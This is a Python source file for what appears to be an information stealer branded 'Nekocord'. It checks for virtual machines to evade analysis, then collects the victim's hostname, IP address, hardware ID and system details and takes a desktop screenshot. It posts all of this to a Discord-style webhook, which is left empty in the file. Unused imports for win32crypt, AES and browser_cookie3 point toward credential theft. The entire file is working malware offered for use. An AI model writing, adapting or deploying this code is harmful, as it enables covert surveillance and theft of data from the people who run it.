import requests
import socket
import time
import psutil
import string
import platform
import subprocess
import json
import base64
import random
import sqlite3
import win32crypt 
import datetime
import re
import wmi
import os
import pyautogui
import tempfile
import sys
import browser_cookie3
from Crypto.Cipher import AES
import ctypes

host = socket.gethostname()
ip = socket.gethostbyname(host)

types = ""
h00k = ""

def is_admin():
    try:
        return os.geteuid() == 0 
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0 
    
def run_as_admin():
    script = sys.argv[0]
    params = " ".join(sys.argv[1:])
    
    if sys.platform == "win32":
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
    else:
        sys.exit(1)

def iplogger():
    data = {
        "username": "Nekocord | Address",
        "avatar_url": "https://i.imgur.com/VF1uUWN.png", 
        "embeds": [{
            "title": "🏠️ IP INFO",
            "fields": [
                {
                    "name": "💻️ Host Name",
                    "value": f"{host}",
                    "inline": True
                },
                {
                    "name": "👀 IP Address",
                    "value": f"||{ip}||",
                    "inline": True
                },
            ],
            "footer": {
                "text": "nekocord. | https://github.com/zakocord/Nekocord"
            }
        }]
    }
    response = requests.post(h00k, json=data)

def machineinfo():
    c = wmi.WMI()
    GPUm = "Unknown"
    for gpu in c.Win32_VideoController():
        GPUm = gpu.Description.strip()
    
    mem = psutil.virtual_memory()

    def machine_hwid():
        command = 'powershell "Get-CimInstance -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        hwid = subprocess.check_output(command, shell=True, text=True).strip()
        return hwid
    
    current_machine_id = machine_hwid()

    total_gb = round(mem.total / 1024**3)
    cpu_info = platform.processor()
    os_name = platform.platform()
    pc_name = platform.node()

    data2 = {
        "username": "Nekocord | Machine", 
        "content": f"{types}",
        "avatar_url": "https://i.imgur.com/VF1uUWN.png",  
        "embeds": [
            {
                "title": "💻️ Machine Info",
                "fields": [
                    {
                        "name": "💻️ PC",
                        "value": f"`{pc_name}`",
                        "inline": False
                    },
                    {
                        "name": "⌨️ OS: ",
                        "value": f"`{os_name}`",
                        "inline": False
                    },
                    {
                        "name": "📝 RAM",
                        "value": f"`{total_gb}GB`",
                        "inline": False
                    },
                    {
                        "name": "📺️ GPU",
                        "value": f"`{GPUm}`",
                        "inline": False
                    },
                    {
                        "name": "🖲️ CPU",
                        "value": f"`{cpu_info}`",
                        "inline": False
                    },
                    {
                        "name": "🔏 HWID",
                        "value": f"`{current_machine_id}`",
                        "inline": False
                    }                       
                ],
                "footer": {
                    "text": "nekocord. | https://github.com/zakocord/Nekocord"
                }   
            }
        ]
    } 

    response2 = requests.post(h00k, json=data2)

def gen_filename(length=10):
    safe_chars = string.ascii_letters + string.digits + "_-"
    return ''.join(random.choice(safe_chars) for _ in range(length))

def screenshot():
    temp_dir = tempfile.gettempdir()
    screenshot_filename = gen_filename(16) + ".png" 
    screenshot_path = os.path.join(temp_dir, screenshot_filename)

    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)

    with open(screenshot_path, "rb") as f:
        files = {"file": (screenshot_filename, f, "image/png")}
        data = {
            "username": "Nekocord | Screenshot", 
            "content": f"📸 Screenshot",
            "avatar_url": "https://i.imgur.com/VF1uUWN.png",  
        }
        response3 = requests.post(h00k, data=data, files=files)
    
    if response3.status_code == 204:
        pass
    else:
        pass

## Anti Environment (virtual environment)
def checker():
    is_vm = False

    ## apponfly | apponfly.com
    hostname = socket.gethostname()
    apponfly = "AppOnFly-VPS"
    if hostname.lower() == apponfly.lower():
        print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
        is_vm = True

    ## VMware | ???
    dmesg = os.popen("dmesg | grep -i vmware").read()
    if "VMware" in dmesg:
        print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
        is_vm = True

    try:
        with open("/sys/class/dmi/id/product_name", "r") as file:
            product_name = file.read().strip()
            if "VirtualBox" in product_name:
                print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
                is_vm = True
    except FileNotFoundError:
        pass

    if os.path.exists("/sys/class/dmi/id/product_name"):
        try:
            with open("/sys/class/dmi/id/product_name", "r") as file:
                product_name = file.read().strip()
                if "Hyper-V" in product_name:
                    print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
                    is_vm = True
        except FileNotFoundError:
            pass

    cpu_info = os.popen("cat /proc/cpuinfo").read()
    if "parallels" in cpu_info.lower():
        print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
        is_vm = True

    if os.path.exists("/dev/virtio"):
        print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
        is_vm = True

    if os.path.exists("/sys/class/dmi/id/product_name"):
        try:
            with open("/sys/class/dmi/id/product_name", "r") as file:
                product_name = file.read().strip()
                if "KVM" in product_name:
                    print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
                    is_vm = True
        except FileNotFoundError:
            pass

    if os.path.exists("/proc/scsi/scsi"):
        scsi_info = os.popen("cat /proc/scsi/scsi").read()
        if "VMware" in scsi_info or "VirtualBox" in scsi_info:
            print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
            is_vm = True

    if is_vm:
        sys.exit(1)

        data_VM = {
            "username": "Nekocord | VM Detection", 
            "content": f"# {types} \n ⚠️WARN⚠️ \n We've detected activity attempting to attack or debug your webhook. This webhook has been removed",
            "avatar_url": "https://i.imgur.com/VF1uUWN.png",  
        }

        response = requests.post(h00k, json=data_VM)
        time.sleep(2)
        deleter = requests.delete(h00k)

def main():
    checker()
    machineinfo()
    iplogger()
    screenshot()

main()
